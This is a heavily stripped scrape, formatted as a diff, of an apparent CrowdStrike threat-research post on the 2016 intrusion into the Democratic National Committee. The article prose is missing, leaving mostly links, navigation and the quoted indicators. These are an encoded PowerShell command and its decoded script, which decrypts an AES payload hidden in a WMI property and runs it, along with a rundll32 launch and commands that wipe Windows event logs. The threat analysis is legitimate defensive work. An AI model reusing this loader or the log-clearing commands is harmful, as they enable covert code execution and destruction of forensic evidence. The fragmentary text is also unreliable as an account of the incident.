@@ -1,0 +1,204 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Bears in the Midst: Intrusion into the Democratic National Committee »
+
+
+https://www.crowdstrike.com/
+https://www.crowdstrike.com/blog/
+https://www.crowdstrike.com/blog/
+#
+https://www.crowdstrike.com/blog/author/dmitri/
+https://www.crowdstrike.com/blog/category/from-the-front-lines/
+
+
+https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html
+https://www.crowdstrike.com/products/falcon-host/
+http://www.thedailybeast.com/articles/2015/04/08/obama-to-putin-stop-hacking-me.html
+http://www.cnn.com/2015/03/10/politics/state-department-hack-worst-ever/
+https://www.theguardian.com/technology/2015/aug/06/us-military-joint-chiefs-hacked-officials-blame-russia
+
+
+Главное Разведывательное Управление
+
+“ ”
+
+Федеральная Служба Безопасности
+
+Служба Внешней Разведки
+
+powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand
+ZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQANAAoACQAJACQAYwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIAZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACQAbQBzACwAIAAkAGMAcgBUAHIALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAcgB5AHAAdABvAFMAdAByAGUAYQBtAE0AbwBkAGUAXQA6ADoAVwByAGkAdABlACkADQAKAAkACQAkAGMAcwAuAFcAcgBpAHQAZQAoACQAZABhAHQAYQAsACAAMAAsACAAJABkAGEAdABhAC4ATABlAG4AZwB0AGgAKQANAAoACQAJACQAYwBzAC4ARgBsAHUAcwBoAEYAaQBuAGEAbABCAGwAbwBjAGsAKAApAA0ACgAJAAkAJAByAGUAdAAgAD0AIAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApAA0ACgAJAAkAJABjAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAAkAJABtAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABkAGUAYwByAEEAZQBzACgAJABlAG4AYwBEAGEAdABhACwAIAAkAGsAZQB5ACwAIAAkAGkAdgApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHAAcgBvAHYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAANAAoACQAJACQAcAByAG8AdgAuAEsAZQB5ACAAPQAgACQAawBlAHkADQAKAAkACQAkAHAAcgBvAHYALgBJAFYAIAA9ACAAJABpAHYADQAKAAkACQAkAGQAZQBjAHIAIAA9ACAAJABwAHIAbwB2AC4AQwByAGUAYQB0AGUARABlAGMAcgB5AHAAdABvAHIAKAAkAHAAcgBvAHYALgBLAGUAeQAsACAAJABwAHIAbwB2AC4ASQBWACkADQAKAAkACQAkAHIAZQB0ACAAPQAgAHAAZQByAGYAQwByACAAJABkAGUAYwByACAAJABlAG4AYwBEAGEAdABhAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABzAFcAUAAoACQAYwBOACwAIAAkAHAATgAsACAAJABhAEsALAAgACQAYQBJACkADQAKAHsADQAKAAkAaQBmACgAJABjAE4AIAAtAGUAcQAgACQAbgB1AGwAbAAgAC0AbwByACAAJABwAE4AIAAtAGUAcQAgACQAbgB1AGwAbAApAHsAcgBlAHQAdQByAG4AIAAkAGYAYQBsAHMAZQB9AA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHcAcAAgAD0AIAAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AJABjAE4AKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAkAHAATgBdAC4AVgBhAGwAdQBlAA0ACgAJAAkAJABlAHgARQBuACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB3AHAAKQANAAoACQAJACQAZQB4AEQAZQBjACAAPQAgAGQAZQBjAHIAQQBlAHMAIAAkAGUAeABFAG4AIAAkAGEASwAgACQAYQBJAA0ACgAJAAkAJABlAHgAIAA9ACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZQB4AEQAZQBjACkADQAKAAkACQBpAGYAKAAkAGUAeAAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGUAeAAgAC0AZQBxACAAJwAnACkADQAKAAkACQB7AHIAZQB0AHUAcgBuAH0ADQAKAAkACQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGUAeAANAAoACQAJAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsADQAKAAkACQByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAJAH0ADQAKAH0ADQAKAA0ACgAkAGEAZQBLACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGUANwAsACAAMAB4AGQANgAsACAAMAB4AGIAZQAsACAAMAB4AGEAOQAsACAAMAB4AGIANwAsACAAMAB4AGUANgAsACAAMAB4ADUANQAsACAAMAB4ADMAYQAsACAAMAB4AGUAZQAsACAAMAB4ADEANgAsACAAMAB4ADcAOQAsACAAMAB4AGMAYQAsACAAMAB4ADUANgAsACAAMAB4ADAAZgAsACAAMAB4AGIAYwAsACAAMAB4ADMAZgAsACAAMAB4ADIAMgAsACAAMAB4AGUAZAAsACAAMAB4AGYAZgAsACAAMAB4ADAAMgAsACAAMAB4ADQAMwAsACAAMAB4ADQAYwAsACAAMAB4ADEAYgAsACAAMAB4AGMAMAAsACAAMAB4AGUANwAsACAAMAB4ADUANwAsACAAMAB4AGIAMgAsACAAMAB4AGMAYgAsACAAMAB4AGQAOAAsACAAMAB4AGMAZQAsACAAMAB4AGQAYQAsACAAMAB4ADAAMAApAA0ACgAkAGEAZQBJACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGIAZQAsACAAMAB4ADcAYQAsACAAMAB4ADkAMAAsACAAMAB4AGQAOQAsACAAMAB4AGQANQAsACAAMAB4AGYANwAsACAAMAB4AGEAYQAsACAAMAB4ADYAZAAsACAAMAB4AGUAOQAsACAAMAB4ADEANgAsACAAMAB4ADYANAAsACAAMAB4ADEAZAAsACAAMAB4ADkANwAsACAAMAB4ADEANgAsACAAMAB4AGMAMAAsACAAMAB4ADYANwApAA0ACgBzAFcAUAAgACcAVwBtAGkAJwAgACcAVwBtAGkAJwAgACQAYQBlAEsAIAAkAGEAZQBJACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=
+
+http://www.ft.com/cms/s/0/668a131e-1928-11e6-b197-a4af20d5575e.html
+http://www.bbc.com/news/world-europe-33072034
+http://www.ecfr.eu/publications/summary/putins_hydra_inside_russias_intelligence_services
+
+
+function perfCr($crTr, $data){
+$ret = $null
+try{
+$ms = New-Object System.IO.MemoryStream
+$cs = New-Object System.Security.Cryptography.CryptoStream -ArgumentList
+@($ms, $crTr, [System.Security.Cryptography.CryptoStreamMode]::Write)
+$cs.Write($data, 0, $data.Length)
+$cs.FlushFinalBlock()
+$ret = $ms.ToArray()
+$cs.Close()
+$ms.Close()
+}
+catch{}
+return $ret
+}
+function decrAes($encData, $key, $iv)
+{
+$ret = $null
+try{
+$prov = New-Object System.Security.Cryptography.RijndaelManaged
+$prov.Key = $key
+$prov.IV = $iv
+$decr = $prov.CreateDecryptor($prov.Key, $prov.IV)
+$ret = perfCr $decr $encData
+}
+Catch{}
+return $ret
+}
+function sWP($cN, $pN, $aK, $aI)
+{
+if($cN -eq $null -or $pN -eq $null){return $false}
+try{
+$wp = ([wmiclass]$cN).Properties[$pN].Value
+$exEn = [Convert]::FromBase64String($wp)
+$exDec = decrAes $exEn $aK $aI
+$ex = [Text.Encoding]::UTF8.GetString($exDec)
+if($ex -eq $null -or $ex -eq ”)
+{return}
+Invoke-Expression $ex
+return $true
+}
+catch{
+return $false
+
+
+
+return $false
+}
+}
+$aeK = [byte[]] (0xe7, 0xd6, 0xbe, 0xa9, 0xb7, 0xe6, 0x55, 0x3a, 0xee,
+0x16, 0x79, 0xca, 0x56, 0x0f, 0xbc, 0x3f, 0x22, 0xed, 0xff, 0x02, 0x43,
+0x4c, 0x1b, 0xc0, 0xe7, 0x57, 0xb2, 0xcb, 0xd8, 0xce, 0xda, 0x00)
+$aeI = [byte[]] (0xbe, 0x7a, 0x90, 0xd9, 0xd5, 0xf7, 0xaa, 0x6d, 0xe9,
+0x16, 0x64, 0x1d, 0x97, 0x16, 0xc0, 0x67)
+sWP ‘Wmi’ ‘Wmi’ $aeK $aeI | Out-Null
+
+rundll32.exe “C:\Windows\twain_64.dll”
+
+wevtutil cl
+System wevtutil cl Security
+
+
+
+http://twitter.com/share?text=Bears in the Midst%3A Intrusion into the Democratic National Committee&url=http%3A%2F%2Fwww.crowdstrike.com%2Fblog%2Fbears-midst-intrusion-democratic-national-committee%2F
+http://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fwww.crowdstrike.com%2Fblog%2Fbears-midst-intrusion-democratic-national-committee%2F&title=Bears in the Midst%3A Intrusion into the Democratic National Committee&summary=%3Cp%3EJune 15%2C 2016 UPDATE%3A CrowdStrike stands fully by its analysis and findings identifying two separate Russian intelligence-affiliated adversaries present in the DNC network in May 2016. On June 15%2C 2016 a blog post to a Wordpress site authored by an%26hellip%3B%3C%2Fp%3E&source=https://www.crowdstrike.com/blog/
+https://www.crowdstrike.com/blog/staff-member/dmitri-alperovitch/
+
+
+…
+
+…
+
+“
+”
+
+https://www.crowdstrike.com/blog/reconnaissance-detection-blue-team/
+https://www.crowdstrike.com/blog/reconnaissance-detection-blue-team/
+https://www.crowdstrike.com/blog/more-than-just-your-esignature-the-analysis/
+https://www.crowdstrike.com/blog/more-than-just-your-esignature-the-analysis/
+
+
+…
+
+https://www.crowdstrike.com/blog/heading-black-hat-2016/
+https://www.crowdstrike.com/blog/heading-black-hat-2016/
+https://www.crowdstrike.com/blog/category/endpoint-protection/
+https://www.crowdstrike.com/blog/category/executive-viewpoint/
+https://www.crowdstrike.com/blog/category/from-the-front-lines/
+https://www.crowdstrike.com/blog/category/threat-intel-research/
+https://www.crowdstrike.com/blog/crowdstrike-forrester-help-demystify-next-gen-endpoint-protection/
+
+
+“ ”
+
+https://www.crowdstrike.com/blog/crowdstrike-forrester-help-demystify-next-gen-endpoint-protection/
+https://twitter.com/CrowdStrike
+https://www.facebook.com/CrowdStrike
+https://plus.google.com/101967380457820256808/posts
+https://www.linkedin.com/company/crowdstrike
+https://www.youtube.com/user/CrowdStrike
+https://www.crowdstrike.com/blog/feed
+https://www.crowdstrike.com/blog/heading-black-hat-2016/
+https://www.crowdstrike.com/blog/irreversible-effects-ransomware-attack/
+https://www.crowdstrike.com/blog/toolkit-helps-evaluate-next-generation-endpoint-protection-platforms/
+https://www.crowdstrike.com/blog/gartners-comparison-of-endpoint-detection-and-response-technologies-and-solutions/
+https://www.crowdstrike.com/see-demo/
+
+
+©
+
+https://www.crowdstrike.com/blog/crowdresponse-release-new-tasks-modules/
+https://www.crowdstrike.com/blog/irreversible-effects-ransomware-attack/
+https://twitter.com/CrowdStrike
+https://www.facebook.com/CrowdStrike/
+https://plus.google.com/101967380457820256808/posts
+https://www.linkedin.com/company/crowdstrike
+http://www.youtube.com/user/CrowdStrike
+/privacy-notice/
+/request-information/
+/blog
+/join-our-team/
+/sitemap/
+/contact-us/
+#
+
+	Bears in the Midst: Intrusion into the Democratic National Committee
+	June 15, 2016 UPDATE:
+	Dmitri Alperovitch
+	Reconnaissance Detection (Blue Team)
+	More Than Just Your eSignature: The Analysis
+	Heading to Black Hat 2016
+	CATEGORIES
+	CONNECT WITH US
+	FEATURED ARTICLES
+	SUBSCRIBE
+	See CrowdStrike Falcon in Action
+
+
+
